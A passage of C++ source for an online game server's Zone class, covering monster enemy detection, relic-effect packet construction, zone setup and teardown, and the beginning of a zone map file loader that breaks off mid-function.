//////////////////////////////////////////////////////////////////////////////
// FileName 	: Zone.cpp
// WrittenBy	:
// Description	:
//////////////////////////////////////////////////////////////////////////////

#include "Zone.h"

#include <stdio.h>
#include <string.h>
#include "Assert.h"
#include "LogClient.h"

#include "ZoneGroup.h"
#include "ZoneInfo.h"
#include "ZoneInfoManager.h"
#include "PCManager.h"
#include "NPCManager.h"
#include "MonsterManager.h"
#include "MasterLairInfoManager.h"
#include "MasterLairManager.h"
#include "WarScheduler.h"
#include "WarSystem.h"
#include "War.h"
#include "QuestManager.h"
#include "VisionInfo.h"

//#include "EventMonsterManager.h"

#include "EffectManager.h"
#include "EffectSchedule.h"
#include "NPCInfo.h"
#include "WeatherManager.h"
#include "Creature.h"
#include "Item.h"
#include "ItemInfo.h"
#include "DarkLightInfo.h"
#include "DB.h"
#include "Slayer.h"
#include "Vampire.h"
#include "Ousters.h"
#include "Monster.h"
#include "NPC.h"
#include "Player.h"
#include "Properties.h"
#include "ZoneUtil.h"
#include "PacketUtil.h"
#include "Party.h"
#include "TradeManager.h"
#include "ParkingCenter.h"
#include "Relic.h"
#include "ItemFactoryManager.h"
#include "CombatInfoManager.h"
#include "PaySystem.h"
#include "GamePlayer.h"
#include "VariableManager.h"
#include "CastleInfoManager.h"
#include "RelicUtil.h"
#include "HolyLandManager.h"
#include "BloodBibleBonusManager.h"
#include "ShrineInfoManager.h"
#include "TimeManager.h"
#include "PKZoneInfoManager.h"
#include "StringPool.h"
#include "FlagSet.h"
#include "PCFinder.h"
#include "DefaultOptionSetInfo.h"
#include "LevelWarZoneInfoManager.h"
#include "SweeperBonusManager.h"

#include "ctf/FlagManager.h"
#include "RegenZoneManager.h"

#include <fstream>
#include <math.h>

#include "EffectDarkness.h"
#include "EffectVampirePortal.h"
#include "SlayerCorpse.h"
#include "VampireCorpse.h"
#include "OustersCorpse.h"
#include "MonsterCorpse.h"
#include "EffectLoaderManager.h"
#include "EffectDecayCorpse.h"
#include "EffectDecayItem.h"
//#include "EffectRevealer.h"
#include "EffectObservingEye.h"
#include "EffectGnomesWhisper.h"
#include "EffectDecayMotorcycle.h"
#include "EffectCallMotorcycle.h"
#include "EffectAddItem.h"
#include "EffectDeleteItem.h"
#include "EffectTransportItem.h"
#include "EffectSanctuary.h"
#include "EffectRelicTable.h"
#include "EffectHasSlayerRelic.h"
#include "EffectHasVampireRelic.h"
#include "EffectVampireRelic.h"
#include "EffectSlayerRelic.h"
#include "EffectHasBloodBible.h"
#include "EffectShrineGuard.h"
#include "EffectShrineHoly.h"
#include "EffectShrineShield.h"
#include "EffectAddItemToCorpse.h"
#include "EffectTransportItemToCorpse.h"
//#include "EffectDropBloodBible.h"
#include "EffectHasCastleSymbol.h"
#include "EffectPKZoneRegen.h"
#include "EffectContinualGroundAttack.h"

#include "EventTransport.h"

#include "GCAddBurrowingCreature.h"
#include "GCAddVampireFromTransformation.h"
#include "GCAddMonsterFromTransformation.h"
#include "GCUntransformOK.h"
#include "GCUntransformFail.h"
#include "GCAddVampireFromBurrowing.h"
#include "GCAddMonsterFromBurrowing.h"
#include "GCAddWolf.h"
#include "GCAddBat.h"
#include "GCAddSlayerCorpse.h"
#include "GCAddVampireCorpse.h"
#include "GCAddOustersCorpse.h"
#include "GCAddMonsterCorpse.h"
#include "GCAddEffectToTile.h"
#include "GCAddVampirePortal.h"
#include "GCDeleteEffectFromTile.h"
#include "GCMineExplosionOK1.h"
#include "GCMineExplosionOK2.h"
#include "GCAddInstalledMineToZone.h"
#include "GCModifyInformation.h"
#include "GCSystemMessage.h"

#include "GCFastMove.h"
#include "GCMove.h"
#include "GCMoveOK.h"
#include "GCMoveError.h"
#include "GCAddMonster.h"
#include "GCAddNewItemToZone.h"
#include "GCDropItemToZone.h"
#include "GCAddNPC.h"
#include "GCAddSlayer.h"
#include "GCAddVampire.h"
#include "GCAddOusters.h"
#include "GCDeleteObject.h"
#include "GCSetPosition.h"
#include "GCUnburrowOK.h"
#include "GCUnburrowFail.h"
#include "GCRemoveEffect.h"
#include "GCAddEffect.h"
#include "GCKnockBack.h"
#include "GCNoticeEvent.h"
#include "GCNPCInfo.h"
#include "GCHolyLandBonusInfo.h"
#include "GCSweeperBonusInfo.h"
#include "GCRegenZoneStatus.h"
#include "GCUnionOfferList.h"
#include "GCMyStoreInfo.h"
//#include "CGItemNameInfoList.h"

#include "item/VampirePortalItem.h"
#include "item/Motorcycle.h"
#include "Profile.h"
#include "ResurrectLocationManager.h"
#include "LevelWarManager.h"
#include "NicknameBook.h"
#include "GQuestManager.h"

#include "EffectCastingTrap.h"

#include "GGCommand.h"
#include "GameServerInfoManager.h"
#include "LoginServerManager.h"
#include "SiegeManager.h"
#include "SkillUtil.h"
#include "GDRLairManager.h"
#include "Store.h"

#include "GuildUnion.h"
#include "GuildManager.h"
#include "DynamicZone.h"

#if defined(__THAILAND_SERVER__) || defined(__CHINA_SERVER__)
// Server CrashEgg Pattern values
// add by inthesky 2004 07 26
const int MAX_EGGSTEP = 7;      // 찍어야할 포지션 수
const int EGG_ZONE = 1311;      // 아우스터즈 마을

int g_EggTableComplete = 0;     // 스텝단계

int g_EggTable[MAX_EGGSTEP][3] = {

    { 115,  68, 0 },
    { 112,  72, 0 },
    { 110,  78, 0 },
    { 110,  85, 0 },
    { 115,  97, 0 },
    { 120,  72, 0 },
    { 114,  83, 0 }
};
#endif


// by sigi.  2002.12.30
//#define __PROFILE_BROADCAST__

#ifdef __PROFILE_BROADCAST__
	#define __BEGIN_PROFILE_ZONE(name)	beginProfileEx(name);
	#define __END_PROFILE_ZONE(name)	endProfileEx(name);
#else
	#define __BEGIN_PROFILE_ZONE(name)	((void)0);
	#define __END_PROFILE_ZONE(name)	((void)0);
#endif

//#define __FULL_PROFILE__

#ifndef __FULL_PROFILE__
#undef beginProfileEx
#define beginProfileEx(name) ((void)0)
#undef endProfileEx
#define endProfileEx(name) ((void)0)
#endif

// 마스터 레어에서 시체/아이템이 바닥에서 사라지는 시간
const Turn_t DELAY_MASTER_LAIR_DECAY_CORPSE 		= 200;	// 20초
const Turn_t DELAY_MASTER_LAIR_DECAY_ITEM   		= 400;	// 40초
const Turn_t DELAY_MASTER_LAIR_DECAY_MASTER_CORPSE 	= 50;	// 5초


int g_FastMoveSearchX[8][4] =
{
	{ 0, 1, 1, 1 },     // LEFT
	{ 0, 1, 0, 1 },   // LEFTDOWN
	{ 0, 0, -1, 1 },    // DOWN
	{ 0, -1, 0, -1 },   // RIGHTDOWN
	{ 0, -1, -1, -1 },  // RIGHT
	{ 0, -1, 0, -1 },   // RIGHTUP
	{ 0, 0, -1, 1 },    // UP
	{ 0, 1, 0, 1 },     // LEFTUP
};

int g_FastMoveSearchY[8][4] =
{
	{ 0, 0, -1, 1 },    // LEFT
	{ 0, -1, -1, 0 },   // LEFTDOWN
	{ 0, -1, -1, -1 },  // DOWN
	{ 0, -1, -1, 0 },   // RIGHTDOWN
	{ 0, 0, -1, 1 },    // RIGHT
	{ 0, 1, 1, 0 },     // RIGHTUP
	{ 0, 1, 1, 1 },     // UP
	{ 0, 1, 1, 0 },     // LEFTUP
};

void
strlwr(char* str)
{
	while (*str!='\0')
	{
		*str = tolower( *str );

		str ++;
	}
}

//////////////////////////////////////////////////////////////////////////////
// 일반적인 몬스터들이 적으로 인식하느냐 마느냐 하는 함수
//////////////////////////////////////////////////////////////////////////////
bool isPotentialEnemy(Monster* pMonster, Creature* pCreature)
{
	Assert(pCreature != NULL);

	if ( pMonster->getOwnerObjectID() == pCreature->getObjectID() ) return false;

	if ( pMonster->getOwnerObjectID() != 0 )
	{
		Creature* pOwner = pMonster->getZone()->getCreature( pMonster->getOwnerObjectID() );
		if ( pOwner != NULL && pOwner->getCreatureClass() == pCreature->getCreatureClass() && canAttack( pOwner, pCreature ) )
		{
//			cout << __PRETTY_FUNCTION__ << pCreature->getName() << "is same race as owner" << pOwner->getName() << endl;
			return false;
		}

		if ( GDRLairManager::Instance().isGDRLairZone(pMonster->getZoneID()) && pCreature->isPC() ) return false;
	}

	if ( SiegeManager::Instance().isSiegeZone(pMonster->getZoneID()) )
	{
/*		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_5 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_4 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_3 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_2 ) ) return true;
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_ATTACKER_1 ) ) return true;

		return false;*/

		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_DEFENDER ) || pCreature->isFlag( Effect::EFFECT_CLASS_SIEGE_REINFORCE ) )
			return false;
	}

	// 현재로서는 슬레이어나 아우스터스는 무조건 적이다. 
	if (pCreature->isSlayer()) return true;

	if (pCreature->isOusters())
	{
		Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);

		if ( (pOusters->getLevel() + 10) <= pMonster->getLevel() ) return true;
		if ( pOusters->getLevel() > 10 ) return true;
	}
	else if (pCreature->isVampire())
	{
		Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);

		// 몬스터의 레벨이 뱀파이어의 레벨보다 10레벨 이상 높을 경우,
		// 적으로 인식한다.
		if ((pVampire->getLevel() + 10) <= pMonster->getLevel())
		{
			return true;
		}

		// 10레벨 이상인 뱀파이어는 적이다.
		if (pVampire->getLevel() > 10)
		{
			return true;
		}
	}
	else if (pCreature->isMonster())
	{
		Monster* pOtherMonster = dynamic_cast<Monster*>(pCreature);

		return pMonster->isFlag(Effect::EFFECT_CLASS_HALLUCINATION) || pMonster->getClanType()!=pOtherMonster->getClanType();
	}

	return false;
}

//////////////////////////////////////////////////////////////////////////////
// STL find_if 알고리즘을 이용하기 위한 비교 클래스
//////////////////////////////////////////////////////////////////////////////
class isSameCreature 
{
public:
	isSameCreature(Creature* pCreature) : m_Creature(pCreature) {}

	bool operator () (Creature* pCreature) 
	{
		return pCreature->getName() == m_Creature->getName();
	}
	
private :
	Creature* m_Creature;
};

list<Packet*> * getRelicEffectPacket( MonsterCorpse* pMonsterCorpse, Effect::EffectClass EClass, list<Packet*> * pPackets )
{
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );

		if ( pEffect == NULL ) cout << (int)EClass << endl;

		Assert(pEffect!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffect->getSendEffectClass() );
		pPacket->setDuration( pEffect->getRemainDuration() );

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	return pPackets;
}


//////////////////////////////////////////////////////////////////////////////
// sendRelicEffect( MonsterCorpse* )
//////////////////////////////////////////////////////////////////////////////
// pMonsterCorpse에 붙은 Effect를 pPlayer에게 보낸다.
//////////////////////////////////////////////////////////////////////////////
list<Packet*> *
createRelicEffect( MonsterCorpse* pMonsterCorpse )
{
	list<Packet*>* pPackets = NULL;

	if (pMonsterCorpse->isFlag(Effect::EFFECT_CLASS_SLAYER_RELIC))
	{
		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(Effect::EFFECT_CLASS_SLAYER_RELIC);
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	if (pMonsterCorpse->isFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC))
	{
		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(Effect::EFFECT_CLASS_VAMPIRE_RELIC);
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	Effect::EffectClass EClass = Effect::EFFECT_CLASS_SHRINE_GUARD;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectShrineGuard* pEffectShrineGuard = dynamic_cast<EffectShrineGuard*>(pEffect);
		Assert(pEffectShrineGuard!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(EClass + pEffectShrineGuard->getShrineID());
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_SHRINE_HOLY;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectShrineHoly* pEffectShrineHoly = dynamic_cast<EffectShrineHoly*>(pEffect);
		Assert(pEffectShrineHoly!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(EClass + pEffectShrineHoly->getShrineID());
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_SHRINE_SHIELD;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectShrineShield* pEffectShrineShield = dynamic_cast<EffectShrineShield*>(pEffect);
		Assert(pEffectShrineShield!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID(EClass);
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_HAS_BLOOD_BIBLE;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectHasBloodBible* pEffectHasBloodBible = dynamic_cast<EffectHasBloodBible*>(pEffect);
		Assert(pEffectHasBloodBible!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffectHasBloodBible->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_HAS_CASTLE_SYMBOL;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		EffectHasCastleSymbol* pEffectHasCastleSymbol = dynamic_cast<EffectHasCastleSymbol*>(pEffect);
		Assert(pEffectHasCastleSymbol!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffectHasCastleSymbol->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_FLAG_INSERT;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffect->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	EClass = Effect::EFFECT_CLASS_KEEP_SWEEPER;
	if (pMonsterCorpse->isFlag(EClass))
	{
		Effect* pEffect = pMonsterCorpse->getEffectManager().findEffect( EClass );
		Assert(pEffect!=NULL);

		GCAddEffect* pPacket = new GCAddEffect;
		pPacket->setObjectID( pMonsterCorpse->getObjectID() );
		pPacket->setEffectID( pEffect->getSendEffectClass() );
		pPacket->setDuration(65000);

		if (pPackets==NULL) pPackets = new list<Packet*>;
		pPackets->push_back( pPacket );
	}

	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_SLAYER_REGEN_ZONE, pPackets );
//	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_VAMPIRE_REGEN_ZONE, pPackets );
//	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_OUSTERS_REGEN_ZONE, pPackets );
//	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_DEFAULT_REGEN_ZONE, pPackets );
	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_SLAYER_TRYING_1, pPackets );
	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_VAMPIRE_TRYING_1, pPackets );
	pPackets = getRelicEffectPacket( pMonsterCorpse, Effect::EFFECT_CLASS_OUSTERS_TRYING_1, pPackets );

	return pPackets;
}

//////////////////////////////////////////////////////////////////////////////
// sendRelicEffect( MonsterCorpse* )
//////////////////////////////////////////////////////////////////////////////
// pMonsterCorpse에 붙은 Effect를 pPlayer에게 보낸다.
//////////////////////////////////////////////////////////////////////////////
void
sendRelicEffect( MonsterCorpse* pMonsterCorpse, Player* pPlayer )
{
	list<Packet*>* pPackets = createRelicEffect( pMonsterCorpse );

	if (pPackets!=NULL)
	{
		list<Packet*>::iterator itr = pPackets->begin();
		for (; itr!=pPackets->end(); itr++)
		{
			Packet* pPacket = *itr;
			pPlayer->sendPacket( pPacket );

			SAFE_DELETE(pPacket);
		}
		SAFE_DELETE(pPackets);
	}
}

//////////////////////////////////////////////////////////////////////////////
// sendRelicEffect( MonsterCorpse* )
//////////////////////////////////////////////////////////////////////////////
// pMonsterCorpse에 붙은 Effect를 (x,y)에 뿌린다.
//////////////////////////////////////////////////////////////////////////////
void
sendRelicEffect( MonsterCorpse* pMonsterCorpse, Zone* pZone, ZoneCoord_t x, ZoneCoord_t y)
{
	list<Packet*>* pPackets = createRelicEffect( pMonsterCorpse );

	if (pPackets!=NULL)
	{
		list<Packet*>::iterator itr = pPackets->begin();
		for (; itr!=pPackets->end(); itr++)
		{
			Packet* pPacket = *itr;
			pZone->broadcastPacket(x, y, pPacket);

			SAFE_DELETE(pPacket);
		}
		SAFE_DELETE(pPackets);
	}
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
Zone::Zone(ZoneID_t zoneID)
	
{
	m_Mutex.setName("Zone");
	m_MutexEffect.setName("ZoneEffect");

	m_ZoneID                  = zoneID;
	m_pZoneGroup              = NULL;
	m_Width                   = 0;
	m_Height                  = 0;
	m_pTiles                  = NULL;
	m_NPCCount                = 0;
	m_MonsterCount            = 0;
	m_pPCManager              = new PCManager();
	m_pNPCManager             = new NPCManager();
	m_pMonsterManager         = new MonsterManager(this);
	m_pMasterLairManager      = NULL;
	m_pWarScheduler      = NULL;
	m_pLevelWarManager		  = NULL;

//	m_pEventMonsterManager    = new EventMonsterManager(this);

	m_pWeatherManager         = new WeatherManager(this);
	m_pEffectManager          = new EffectManager();
	m_pLockedEffectManager    = new EffectManager();
	m_pVampirePortalManager   = new EffectManager();
	m_pEffectScheduleManager  = new EffectScheduleManager();
	m_pLocalPartyManager      = new LocalPartyManager();
	m_pPartyInviteInfoManager = new PartyInviteInfoManager();
	m_pTradeManager           = new TradeManager;

	m_bPayPlay = false;
	m_bPremiumZone = false;
	m_bPKZone = false;
	m_bNoPortalZone = false;
	m_bMasterLair = false;
	m_bCastle = false;
	m_bHolyLand = false;
	m_bHasRelicTable	= false;

	getCurrentTime( m_LoadValueStartTime );

	m_LoadValue = 0;

	m_bTimeStop = false;

	getCurrentTime( m_UpdateTimebandTime );

	m_pDynamicZone = NULL;

}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
Zone::Zone(ZoneID_t zoneID, ZoneCoord_t width, ZoneCoord_t height)
	
{
	__BEGIN_TRY

	Assert(false);
	/*
	m_Mutex.setName("Zone");
	m_MutexEffect.setName("ZoneEffect");

	m_ZoneID     = zoneID;
	m_pZoneGroup = NULL;
	m_Width      = width;
	m_Height     = height;

	getCurrentTime( m_LoadValueStartTime );

	m_pTiles     = NULL;

	Assert(m_ZoneID > 0);

	m_pTiles = new Tile* [ m_Width ];
	for (uint i = 0 ; i < m_Width ; i++) m_pTiles[i] = new Tile [m_Height];

	m_ppLevel = new (ZoneLevel_t*)[ m_Width ];
	for (uint i = 0; i < m_Width ; i++) m_ppLevel[i] = new ZoneLevel_t[m_Height];

	m_pPCManager              = new PCManager();
	m_pNPCManager             = new NPCManager();
	m_pMonsterManager         = new MonsterManager(this);
	m_pMasterLairManager         = NULL;
	m_pWarScheduler         = NULL;

	m_pEventMonsterManager    = new EventMonsterManager(this);

	m_pWeatherManager         = new WeatherManager(this);
	m_pEffectManager          = new EffectManager();
	m_pLockedEffectManager    = new EffectManager();
	m_pVampirePortalManager   = new EffectManager();
	m_pEffectScheduleManager  = new EffectScheduleManager();
	m_pLocalPartyManager      = new LocalPartyManager();
	m_pPartyInviteInfoManager = new PartyInviteInfoManager();
	m_pTradeManager           = new TradeManager;
	m_pDynamicZone = NULL;
	*/

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
Zone::~Zone ()
	
{
	__BEGIN_TRY
		
	if (m_pTiles != NULL) 
	{
		for (uint i=0 ; i<m_Width; i++) SAFE_DELETE_ARRAY(m_pTiles[i]);
		SAFE_DELETE_ARRAY(m_pTiles);
	}	

	if (m_ppLevel != NULL) 
	{
		for (uint i=0; i<m_Width; i++) SAFE_DELETE_ARRAY(m_ppLevel[i]);
		SAFE_DELETE_ARRAY(m_ppLevel);
	}	

	if (m_pSectors != NULL) 
	{
		for (int i=0; i<m_SectorWidth; i++) SAFE_DELETE_ARRAY(m_pSectors[i]);
		SAFE_DELETE_ARRAY(m_pSectors);
	}	

	SAFE_DELETE(m_pPCManager);
	SAFE_DELETE(m_pNPCManager);
	SAFE_DELETE(m_pMonsterManager);
	SAFE_DELETE(m_pMasterLairManager);
	SAFE_DELETE(m_pWarScheduler);

//	SAFE_DELETE(m_pEventMonsterManager);

	SAFE_DELETE(m_pWeatherManager);
	SAFE_DELETE(m_pEffectManager);
	SAFE_DELETE(m_pLockedEffectManager);
	SAFE_DELETE(m_pVampirePortalManager);
	SAFE_DELETE(m_pEffectScheduleManager);
	SAFE_DELETE(m_pLocalPartyManager);
	SAFE_DELETE(m_pPartyInviteInfoManager);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// initialize zone
//////////////////////////////////////////////////////////////////////////////
void Zone::init ()
	
{
	__BEGIN_TRY

#ifdef __USE_ENCRYPTER__
	int serverID = g_pConfig->getPropertyInt( "ServerID" );

	//m_EncryptCode = (uchar)( ( ( m_ZoneID >> 8 ) ^ m_ZoneID ) ^ ( ( serverID + 1 ) << 4 ) );
	if ( !isDynamicZone() ) 
	{
		m_EncryptCode = EncryptCode( m_ZoneID, serverID );
	}
	else
	{
		m_EncryptCode = EncryptCode( m_pDynamicZone->getTemplateZoneID(), serverID );
	}
#endif

	load();

	m_pWeatherManager->init();

	DarkLightInfo* pDIInfo = NULL;

	switch (m_ZoneType)
	{
		case ZONE_NORMAL_FIELD:
			pDIInfo = g_pDarkLightInfoManager->getCurrentDarkLightInfo( this );
			m_DarkLevel  = pDIInfo->getDarkLevel();
			m_LightLevel = pDIInfo->getLightLevel();
			break;
		case ZONE_NORMAL_DUNGEON:
		case ZONE_PC_VAMPIRE_LAIR:
		case ZONE_NPC_VAMPIRE_LAIR:
			m_DarkLevel = 15;
			m_LightLevel = 6;
			break;
		case ZONE_SLAYER_GUILD:
		case ZONE_RESERVED_SLAYER_GUILD:
		case ZONE_NPC_HOME:
		case ZONE_NPC_SHOP:
		case ZONE_CASTLE:
		case ZONE_RANDOM_MAP:
			m_DarkLevel  = 0;
			m_LightLevel = 14;
			break;
		default:
			pDIInfo = g_pDarkLightInfoManager->getCurrentDarkLightInfo( this );
			m_DarkLevel  = pDIInfo->getDarkLevel();
			m_LightLevel = pDIInfo->getLightLevel();
			break;
	}

	switch ( m_ZoneID )
	{
		case 1131:
		case 1132:
		case 1133:
		case 1134:
			{
				m_pLevelWarManager = new LevelWarManager( m_ZoneID-1130, this );
				m_pLevelWarManager->init();
				break;
			}

		case 1500:
			{
			}
			break;
		default:
			break;
	}

	m_bCastleZone = g_pCastleInfoManager->isCastleZone(m_ZoneID);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// 존 파일에서 존 정보를 읽어서 로딩한다.
//////////////////////////////////////////////////////////////////////////////
void Zone::load(bool bOutput)
	
{
	__BEGIN_TRY
	__BEGIN_DEBUG
try {

	DWORD  versionLen;
  char* pVersionLen = (char*)(&versionLen);
	WORD   zoneID;
	WORD   zoneGroupID;
	DWORD  zonenameLen;
	BYTE   zoneType;
	BYTE   zoneLevel;
	DWORD  descLen;
	char*  pDesc = NULL;
	char*   version = new char [128];
	char*   zonename = new char [128];
	char* 	lwrFilename = new char[256];

	ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo(m_ZoneID);

	Assert(pZoneInfo!=NULL);

	setPayPlay( pZoneInfo->isPayPlay() );
	setPremiumZone( pZoneInfo->isPremiumZone() );
	setPKZone( pZoneInfo->isPKZone() );
	setNoPortalZone( pZoneInfo->isNoPortalZone() );
	setMasterLair( pZoneInfo->isMasterLair() );
	setHolyLand( pZoneInfo->isHolyLand() );

	// Holy Land 일 경우 HolyLandManager 에 추가
	if ( isHolyLand() )
	{
		g_pHolyLandManager->addHolyLand( this );
	}

	if (g_pCastleInfoManager->getCastleInfo(m_ZoneID)!=NULL)
	{
		setCastle( true );
	}
	else
	{
		setCastle( false );
	}

	//filelog("zoneInfo.txt", "[%d] %d %d", (int)m_ZoneID, (int)isPayPlay(), (int)isPremiumZone());

	// SMP 정보 파일을 연다.
	string SMPFilename = g_pConfig->getProperty("HomePath") + "/data/" + pZoneInfo->getSMPFilename();
	ifstream SMP(SMPFilename.c_str(), ios::in | ios::binary );
	if (!SMP)
	{
		strcpy(lwrFilename, SMPFilename.c_str());
		strlwr( lwrFilename );
		SMP.open(lwrFilename, ios::in | ios::binary );

		//cout << "second chk : " << lwrFilename.c_str() << endl;

		if (!SMP)
		{
			StringStream msg;
			msg << SMPFilename << " not exist or cannot open it";
			cerr << msg.toString() << endl;
			throw FileNotExistException(msg.toString());
		}
	}

    // read zone version
	SMP.read(pVersionLen,szDWORD);
	SMP.read(version,versionLen);
	version[versionLen] = 0;
	
	// read zone id
	SMP.read((char*)&zoneID,szWORD);
	
	// read zone group id (no use)
	SMP.read((char*)&zoneGroupID,szWORD);
	
	// read zone name
	SMP.read((char*)&zonenameLen,szDWORD);
	if (zonenameLen > 0)
	{
		SMP.read(zonename,zonenameLen);
		zonename[zonenameLen] = 0;
	}

    // read zone type & level 
	SMP.read((char*)&zoneType,szBYTE);
	SMP.read((char*)&zoneLevel,szBYTE);

	// read zone description
	SMP.read((char*)&descLen,szDWORD);
	if (descLen > 0)
	{
		pDesc = new char[descLen+1];
		SMP.read(pDesc,descLen);
		pDesc[descLen] = 0;
	
		SAFE_DELETE_ARRAY(pDesc);	// add '_ARRAY' moved to here.. by sigi 2002.5.2
	}

	// read zone width & height
	SMP.read((char*)&m_Width, szWORD);
	SMP.read((char*)&m_Height ,szWORD);

	Assert(m_Width <= maxZoneWidth);
	Assert(m_Height <= maxZoneHeight);

  // DEBUG by tiancaiamao
  // cout << "szWORD: " << szWORD << " szDWORD: " << szDWORD << endl;
  // cout << "szVersion: " << versionLen << endl;
  // cout << "zone id: " << zoneID << " zone group id:"  << zoneGroupID << endl;
  // cout << "zone name len:" << zonenameLen << " desc len:" << descLen << endl;
  // cout << " type: " << (uint8_t)zoneType << " level: " << (uint8_t)zoneLevel << " width: " << m_Width << " height: " << m_Height << endl;

	// 타일을 2차원배열로 만들어 메모리를 할당한다.
	m_pTiles = new Tile* [ m_Width ];
	for (uint i = 0 ; i < m_Width ; i++) 
	{
		m_pTiles[i] = new Tile [m_Height];
	}

	// 섹터를 2차원 배열로 만들어 메모리를 할당한다.
	m_SectorWidth = (int)ceil((float)m_Width/(float)SECTOR_SIZE);
	m_SectorHeight = (int)ceil((float)m_Height/(float)SECTOR_SIZE);
	m_pSectors = new Sector*[m_SectorWidth];
	for (int x=0; x<m_SectorWidth; x++)
	{
		m_pSectors[x] = new Sector[m_SectorHeight];
	}

	// 각각의 타일에다가 섹터 포인터를 세팅한다.
	for (int x=0; x<m_Width; x++)
	{
		for (int y=0; y<m_Height; y++)
		{
			int sx = x/SECTOR_SIZE;
			int sy = y/SECTOR_SIZE;

			Assert(sx < m_SectorWidth && sy < m_SectorHeight);

			m_pTiles[x][y].setSector(&m_pSectors[sx][sy]);
		}
	}

	// 섹터끼리 연결을 한다.
	VSRect srect(0, 0, m_SectorWidth-1, m_SectorHeight-1);
	for (int x=0; x<m_SectorWidth; x++)
	{
		for (int y=0; y<m_SectorHeight; y++)
		{
			for (uint d=0; d<9; d++)
			{
				int sectorx = x + dirMoveMask[d].x;
				int sectory = y + dirMoveMask[d].y;

				if (srect.ptInRect(sectorx, sectory))
				{
					m_pSectors[x][y].setNearbySector(d, &m_pSectors[sectorx][sectory]);
				}
			}
		}
	}

